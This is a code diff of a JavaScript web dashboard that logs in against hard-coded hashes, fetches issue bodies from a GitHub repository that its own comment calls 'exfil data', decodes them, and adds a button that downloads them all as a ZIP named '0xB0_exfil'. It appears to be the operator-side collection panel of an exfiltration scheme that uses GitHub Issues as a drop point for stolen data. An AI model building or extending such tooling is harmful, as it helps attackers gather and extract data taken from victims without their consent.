@@ -4,7 +4,6 @@
     const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
     const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';
 
-    // ---- safe DOM access ----
     function getElements() {
         const loginPage = document.getElementById('loginPage');
         const dashboardPage = document.getElementById('dashboardPage');
@@ -15,10 +14,10 @@
         const logContainer = document.getElementById('logContainer');
         const refreshBtn = document.getElementById('refreshBtn');
         const logoutBtn = document.getElementById('logoutBtn');
-        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn };
+        const downloadBtn = document.getElementById('downloadBtn');
+        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn };
     }
 
-    // ---- hashing (with fallback) ----
     async function hashString(str) {
         try {
             const encoder = new TextEncoder();
@@ -47,7 +46,6 @@
         sessionStorage.setItem(SESSION_KEY, state ? 'true' : 'false');
     }
 
-    // ---- Dashboard / Login toggles ----
     function showDashboard() {
         const els = getElements();
         if (!els.loginPage || !els.dashboardPage) {
@@ -78,7 +76,6 @@
         if (els.loginError) els.loginError.textContent = '';
     }
 
-    // ---- fetch exfil data from GitHub Issues ----
     const REPO = 'va1uxxx/0xB0';
     const API_URL = `https://api.github.com/repos/${REPO}/issues`;
 
@@ -102,7 +99,7 @@
             }
             const sorted = issues.slice().reverse();
             let html = '';
-            sorted.forEach(issue => {
+            sorted.forEach((issue, index) => {
                 const title = escapeHtml(issue.title || 'Untitled');
                 const time = new Date(issue.created_at).toLocaleString();
                 let body = issue.body || '';
@@ -120,7 +117,7 @@
                 const displayBody = escapeHtml(decoded);
                 const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                 html += `
-                    <div class="entry">
+                    <div class="entry" data-index="${index}">
                         <div class="entry-header">
                             <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
                             <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
@@ -162,7 +159,34 @@
         return str.replace(/[&<>"']/g, function(m) { return map[m]; });
     }
 
-    // ---- INIT ----
+    function downloadZip() {
+        const els = getElements();
+        if (!els.logContainer) return;
+        const entries = els.logContainer.querySelectorAll('.entry');
+        if (entries.length === 0) {
+            alert('No data to download.');
+            return;
+        }
+        const zip = new JSZip();
+        entries.forEach((entry, idx) => {
+            const bodyDiv = entry.querySelector('.entry-body');
+            if (bodyDiv) {
+                const text = bodyDiv.textContent.trim();
+                const fileName = `entry_${idx+1}.txt`;
+                zip.file(fileName, text);
+            }
+        });
+        zip.generateAsync({ type: 'blob' }).then(function(content) {
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(content);
+            link.download = `0xB0_exfil_${new Date().toISOString().slice(0,10)}.zip`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(link.href);
+        });
+    }
+
     function init() {
         const els = getElements();
         if (!els.loginForm || !els.usernameInput || !els.passwordInput || !els.loginError) {
@@ -170,7 +194,6 @@
             return;
         }
 
-        // login handler
         els.loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             const user = els.usernameInput.value.trim();
@@ -196,7 +219,6 @@
             }
         });
 
-        // logout
         if (els.logoutBtn) {
             els.logoutBtn.addEventListener('click', function() {
                 setLoggedIn(false);
@@ -204,7 +226,6 @@
             });
         }
 
-        // refresh
         if (els.refreshBtn) {
             els.refreshBtn.addEventListener('click', function() {
                 this.innerHTML = '<i class="fas fa-spinner spinner"></i>';
@@ -214,14 +235,16 @@
             });
         }
 
-        // session check
+        if (els.downloadBtn) {
+            els.downloadBtn.addEventListener('click', downloadZip);
+        }
+
         if (isLoggedIn()) {
             showDashboard();
         } else {
             showLogin();
         }
 
-        // keyboard shortcut: Escape to logout
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape' && isLoggedIn()) {
                 setLoggedIn(false);
@@ -230,7 +253,6 @@
         });
     }
 
-    // ---- start after DOM ready ----
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
